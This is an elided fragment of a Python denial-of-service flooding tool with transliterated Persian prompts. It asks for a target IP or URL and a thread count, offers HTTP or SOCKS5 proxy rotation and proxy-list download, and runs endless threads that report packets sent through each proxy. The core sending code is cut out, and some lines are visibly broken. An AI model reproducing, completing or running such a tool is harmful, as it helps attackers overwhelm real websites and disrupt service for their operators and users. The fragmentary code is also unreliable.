...
def get_parameters():
	...
	optp.add_option("-t","--threads", dest="numthreads")
	optp.add_option("-i","--ip", dest="url")
	optp.add_option("-m","--multiple", dest="multiple")
	optp.add_option("-s","--start", dest="start")
...
\033[0m\n» ''')
	...
	if choice1 == "1":
		ip_file = input("\n\033[96m❖  \033[97File IP Site Haro Vred Kunid » \033[0m")
		...
		if url == "":
			print ('''
\033[91m +--------------------------------------------+
            \033[91m⚠️ \033[93mPlease enter the url. \033[91m⚠️
            ''')
			starturl()
...
def proxymode():
	global choice2
	choice2 = input("\033[96m❖ \033[97mAya Mikhayd Ba Proxy Attack Bznid ? [y=Proxy *=Normal] » \033[0m")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()
...
def choiceproxysocks():
	global choice3
	choice3 = input("\033[96m❖ \033[97mNoe Proxy Ra Entkhab Kunid [1=Socks5 0=Http] » \033[0m")
	if choice3 == "0":
		choicedownproxy()
	elif choice3 == "1":
		choicedownsocks()
...
def choicedownproxy():
	choice4 = input("\033[96m❖ \033[97mAya Proxy List Jadid Mikhayd ? [y=download *=no] » \033[0m")
	if choice4 == "y":
...
def choicedownsocks():
	choice4 = input("\033[96m❖ \033[97m Aya Proxy List Jadid Mikhayd ? [y=download *=no] »\033[0m » \033[0m")
	if choice4 == "y":
...
def proxylist():
	global proxies
	out_file = str(input("\033[95m✠ \033[97mList Proxy Haro Vared Kunid (proxy.txt) » \033[0m"))
	if out_file == "":
		out_file = "proxy.txt"
	...
	def run(self): 
		...
		while True: 
			try:
				...
				print ("\033[97m[\033[92m!\033[97m] \033[97mPacket Sended By \033[96m " + str(proxy[0]+":"+proxy[1]) + " \033[95m@ \033[97m", self.counter)
				try: 
		...
		while True:
			try:
				...
				try: 
					...
					print ("\033[97m[\033[91m!\033[97m] \033[91mProxy Dardastres Nist! \033[95m@ \033[97m", self.counter)
					s.close() 
